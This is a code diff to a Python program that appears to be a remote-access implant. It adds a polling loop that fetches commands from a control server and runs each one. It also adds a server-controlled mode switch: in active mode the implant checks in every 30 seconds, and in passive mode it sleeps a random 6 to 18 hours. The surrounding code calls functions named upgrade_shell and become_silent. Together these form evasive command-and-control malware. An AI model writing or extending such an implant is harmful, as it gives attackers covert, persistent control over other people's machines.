@@ -50,6 +50,17 @@ def request_commands():
     r = requests.get(f"http://0.0.0.0:{PORT + 1}/commands.txt")
     return r.text.split()
 
+def check_active():
+    """Check if agent should be active or passive
+
+    Returns:
+        bool: true if active
+    """
+    r = requests.get(f"http://0.0.0.0:{PORT + 1}/mode.txt")
+    if r.text == "active":
+        return True
+    return False
+
 def run_builtin(command):
     """Run builtin command, not local terminal 
 
@@ -172,11 +183,20 @@ def check_mark(cmdline):
     #     return True
     return False
 
+
+def delay_for_mode():
+    if check_active():
+        time.sleep(30)
+    else:
+        time.sleep(random.randrange(21600, 64800))
+
 if __name__ == "__main__":
     upgrade_shell()
     become_silent()
-     #TODO Polling
-    cmds = request_commands()
 
-    # for cmd in cmds:
-        # handle(cmd.split(":"))
+    while 1:
+        delay_for_mode()
+        cmds = request_commands()
+
+        for cmd in cmds:
+            handle(cmd.split(":"))
